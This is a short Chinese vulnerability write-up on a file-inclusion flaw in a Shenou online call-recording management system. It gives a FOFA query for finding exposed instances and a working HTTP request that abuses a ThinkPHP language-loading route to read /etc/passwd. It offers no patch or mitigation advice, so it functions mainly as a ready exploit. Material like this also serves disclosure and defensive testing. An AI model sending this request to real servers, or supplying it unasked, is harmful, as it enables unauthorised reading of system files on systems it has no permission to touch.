# 申瓯通信设备有限公司在线录音管理系统index存在文件包含漏洞

# 一、漏洞简介
申瓯通信设备有限公司在线录音管理系统系统是一款全面的企业管理软件，涵盖多个领域，助力企业实现信息化管理和业务优化。申瓯通信设备有限公司在线录音管理系统index存在文件包含漏洞。

# 二、影响版本
+ 在线录音管理系统

# 三、资产测绘
+ fofa`title="在线录音管理系统"<font style="color:rgb(221, 17, 68);"></font>`

![1718298593944-67a12797-71e8-44ee-8755-020482502e3d.png](./img/S_cYMDLU99OSGVbJ/1718298593944-67a12797-71e8-44ee-8755-020482502e3d-126112.png)

# 四、漏洞复现
```java
GET /callcenter/public/index.php?s=index/\think\Lang/load&file=/etc/passwd HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
Cache-Control: no-cache
Pragma: no-cache
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```

![1718714151400-95020a2d-915f-4d12-b219-daf747b492c3.png](./img/S_cYMDLU99OSGVbJ/1718714151400-95020a2d-915f-4d12-b219-daf747b492c3-939244.png)



> 更新: 2024-06-23 23:42:49  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zdcq09yhyllgqpdn>